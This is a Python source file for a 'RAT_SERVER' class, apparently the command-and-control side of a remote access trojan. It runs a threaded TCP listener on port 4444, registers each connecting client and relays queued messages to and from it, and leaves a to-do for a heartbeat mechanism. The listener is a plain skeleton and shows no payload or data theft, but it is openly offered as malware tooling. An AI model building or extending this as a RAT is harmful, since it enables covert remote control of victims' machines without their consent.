import socket
import threading
from Terminal import Terminal
from queue import Queue
import threading
class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = []
        self.on_client_connected = None
        self.on_client_disconnected = None
    def build_connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] Waiting for the client...")
        
        while True:
            client, addr = s.accept()
            client_thread = threading.Thread(target=self.handle_client, args=(client, addr))
            client_thread.start()

    def handle_client(self, client, addr):
        ipcli = client.recv(1024).decode()
        print(f"[*] Connection is established successfully with {ipcli}")
        self.clients.append((client, *addr, Queue(), Queue()))
        self.on_client_connected(*addr)
        # to do 心跳机制
        send_thread = threading.Thread(target=self.send_msg, args=(self.clients[-1][3], client))
        recv_thread = threading.Thread(target=self.recv_msg, args=(self.clients[-1][4], client))  
        send_thread.start()
        recv_thread.start()      
        recv_thread.join()
        client.close()
        send_thread.join()
        

    def get_client(self, ip, port) :
        for client, ip_tmp, port_tmp, send_buf, recv_buf in self.clients:
            if ip_tmp== ip and port_tmp == int(port):
                return client, send_buf, recv_buf
        raise Exception("Client not found")
    
    
    def send_msg(self, buf: Queue, client: socket.socket):
        while True:
            try:
                if buf.empty() is False:
                    msg = buf.get()
                    print(f"send {msg}")
                    client.send(msg.encode())
            except Exception as e:
                break
    
    def recv_msg(self, buf: Queue, client: socket.socket):
        while True:
            try:
                msg = client.recv(1024).decode()
                print(f"recv {msg}")
                buf.put(msg)
            except Exception as e:
                break
                
        
    
    
if __name__ == "__main__":
    host = "127.0.0.1"
    port = 4444
    rat = RAT_SERVER(host, port)
    rat.build_connection()